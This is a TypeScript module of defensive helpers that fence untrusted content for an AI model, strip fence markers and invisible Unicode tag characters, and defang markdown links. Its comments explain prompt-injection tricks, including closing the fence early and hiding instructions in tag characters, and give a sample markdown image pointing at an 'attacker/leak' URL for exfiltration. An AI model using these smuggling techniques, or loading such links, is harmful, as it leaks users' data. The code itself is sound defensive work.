/**
 * untrustedContent — canonical helper for fencing model-visible content that
 * came from an UNTRUSTED source: circle members, external chat/Discord, room
 * messages, retrieved memory, tool/observation output, uploaded files, web
 * pages. The roadmap's untrusted-content rule requires such content be wrapped
 * so the model treats it as DATA to read, never as instructions to follow —
 * even if it looks like a command or a system message.
 *
 * Why a shared helper (vs. inline `<untrusted_quoted>…</…>`): the inline form
 * scattered across the prompt builders does NOT defang nested fence markers,
 * so a member who types `</untrusted_quoted>` into their note/name/message
 * could close the fence early and smuggle the rest of their text out as
 * trusted instructions. `wrapUntrusted` strips those markers first, closing
 * that injection hole. Pure + dependency-free so it stays smoke-testable and
 * importable anywhere.
 */

export const UNTRUSTED_OPEN = '<untrusted_quoted>';
export const UNTRUSTED_CLOSE = '</untrusted_quoted>';

// Matches the fence marker incl. spaced/cased variants (`< / untrusted_quoted >`,
// `</UNTRUSTED_QUOTED>`). Defined as a source string so each use gets a FRESH
// regex — a shared `/g` regex carries `lastIndex` state across .test()/.replace()
// and would intermittently miss matches.
const FENCE_MARKER_SOURCE = '<\\s*\\/?\\s*untrusted_quoted\\s*>';

export interface WrapUntrustedOptions {
  /** Optional trusted heading placed ABOVE the fence (never inside it). */
  heading?: string;
  /** Truncate the fenced body to this many chars (adds an ellipsis). */
  maxChars?: number;
}

/**
 * Wrap untrusted content in an `<untrusted_quoted>` fence. Returns '' for
 * empty/blank input so callers can push unconditionally and filter. Any
 * nested fence markers in the content are stripped first so embedded text
 * cannot escape the fence.
 */
export function wrapUntrusted(
  content: string | null | undefined,
  opts: WrapUntrustedOptions = {},
): string {
  const raw = String(content ?? '').trim();
  if (!raw) return '';
  let body = raw.replace(new RegExp(FENCE_MARKER_SOURCE, 'gi'), '');
  if (opts.maxChars && opts.maxChars > 0 && body.length > opts.maxChars) {
    body = `${body.slice(0, opts.maxChars)}…`;
  }
  const fenced = `${UNTRUSTED_OPEN}\n${body}\n${UNTRUSTED_CLOSE}`;
  return opts.heading ? `${opts.heading}\n${fenced}` : fenced;
}

/** True if the text contains a fence marker (e.g. to detect smuggling attempts). */
export function containsFenceMarker(content: string | null | undefined): boolean {
  return new RegExp(FENCE_MARKER_SOURCE, 'i').test(String(content ?? ''));
}

// ── sanitizeUntrustedForModel — bridge-client read-boundary hardening ───────
//
// `wrapUntrusted` / the inline fence tell the model "treat this as data".
// That's necessary but not sufficient for content harvested from a live
// screen / page / clipboard / file: two payload-level tricks survive fencing.
//
//   1. Invisible Unicode TAG chars (U+E0000–U+E007F). These render as
//      nothing but carry ASCII — a "tag-smuggled" instruction hidden inside
//      a benign-looking a11y label or page title. The model can read them
//      even though a human reviewer sees nothing. We strip them outright:
//      there is no legitimate reason for Tag chars in observed UI text.
//
//   2. Auto-loading markdown images/links: `![x](http://attacker/leak?…)`.
//      A renderer that eagerly fetches the image (or a model that treats the
//      link as actionable) turns quoted, untrusted content into an
//      exfiltration/SSRF vector the instant it is displayed. We DEFANG the
//      syntax so it renders inert WITHOUT deleting the URL text — the model
//      (and the user) still see the address, it just can't auto-load.
//
// CRITICAL: this operates ONLY on the model-visible representation. Callers
// must keep the raw payload (for user display, file writes, clipboard round-
// trips) untouched — sanitize a COPY destined for the model, never the source.

// U+E0000–U+E007F (Unicode Tag block). `u` flag + code-point class.
const UNICODE_TAG_CHARS = /[\u{E0000}-\u{E007F}]/gu;

// Markdown image: `![alt](url)` (and the `!` may be preceded by nothing or
// non-`!` text). Capture alt + url so we can rebuild an inert, readable form.
const MD_IMAGE = /!\[([^\]]*)\]\(([^)\s]+)(?:\s+"[^"]*")?\)/g;

// Markdown link: `[text](url)`. Same idea. Runs AFTER the image pass so the
// leading `!` of an image is already consumed and won't be mistaken for a link.
const MD_LINK = /\[([^\]]*)\]\(([^)\s]+)(?:\s+"[^"]*")?\)/g;

/**
 * Sanitize a string for MODEL-VISIBLE use at an untrusted read boundary.
 * Additive to fencing (`wrapUntrusted` / `fenceUntrustedObservationText`):
 * fence first-or-after, this strips payload-level smuggling that fencing
 * alone does not neutralize.
 *
 *  - strips invisible Unicode Tag chars (U+E0000–U+E007F) unconditionally;
 *  - defangs auto-loading markdown image/link syntax so it renders inert
 *    while KEEPING the URL text visible (`![a](u)` → `(image: a — u)`,
 *    `[a](u)` → `a (link: u)`);
 *  - leaves normal text (incl. bare URLs, code, punctuation) unchanged.
 *
 * Returns '' for null/undefined so callers can pass optional fields straight
 * through. Never throws; pure + dependency-free (smoke-testable anywhere).
 */
export function sanitizeUntrustedForModel(text: string | null | undefined): string {
  if (text == null) return '';
  let out = String(text);
  // 1. Drop invisible tag-smuggling code points entirely.
  out = out.replace(UNICODE_TAG_CHARS, '');
  // 2. Defang markdown images first (they start with `!`), then links.
  //    Neutralized forms keep the URL as plain text (no `](` pair remains),
  //    so no renderer auto-loads it and the model still sees the address.
  out = out.replace(MD_IMAGE, (_m, alt: string, url: string) => {
    const label = String(alt || '').trim();
    return label ? `(image: ${label} — ${url})` : `(image — ${url})`;
  });
  out = out.replace(MD_LINK, (_m, label: string, url: string) => {
    const text2 = String(label || '').trim();
    return text2 ? `${text2} (link: ${url})` : `(link: ${url})`;
  });
  return out;
}
